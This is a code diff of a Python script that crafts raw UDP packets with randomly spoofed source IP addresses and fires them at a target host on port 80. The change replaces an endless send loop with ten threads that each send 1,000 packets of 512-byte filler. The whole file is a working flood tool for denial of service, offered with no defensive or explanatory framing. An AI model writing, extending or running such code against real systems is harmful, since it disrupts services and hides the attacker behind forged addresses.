@@ -1,7 +1,7 @@
 import socket
 import struct
 import random
-import sys
+import threading
 
 def create_socket():
     try:
@@ -62,17 +62,28 @@ def create_packet(source_ip, dest_ip, source_port, dest_port, data):
     udp_header = create_udp_header(source_port, dest_port, data, source_ip, dest_ip)
     return ip_header + udp_header + data
 
+def send_packets(sock, target_ip, target_port, data, num_packets):
+    for _ in range(num_packets):
+        source_ip = generate_random_ip()
+        packet = create_packet(source_ip, target_ip, random.randint(1024, 65535), target_port, data)
+        sock.sendto(packet, (target_ip, 0))
+
 def main():
     sock = create_socket()
-    source_port = 80
     dest_ip = '192.168.1.2'
     dest_port = 80
     data = b'A' * 512
+    num_packets_per_thread = 1000
+    num_threads = 10
 
-    while True:
-        source_ip = generate_random_ip()
-        packet = create_packet(source_ip, dest_ip, source_port, dest_port, data)
-        sock.sendto(packet, (dest_ip, 0))
+    threads = []
+    for _ in range(num_threads):
+        t = threading.Thread(target=send_packets, args=(sock, dest_ip, dest_port, data, num_packets_per_thread))
+        t.start()
+        threads.append(t)
+    
+    for t in threads:
+        t.join()
 
 if __name__ == "__main__":
     main()
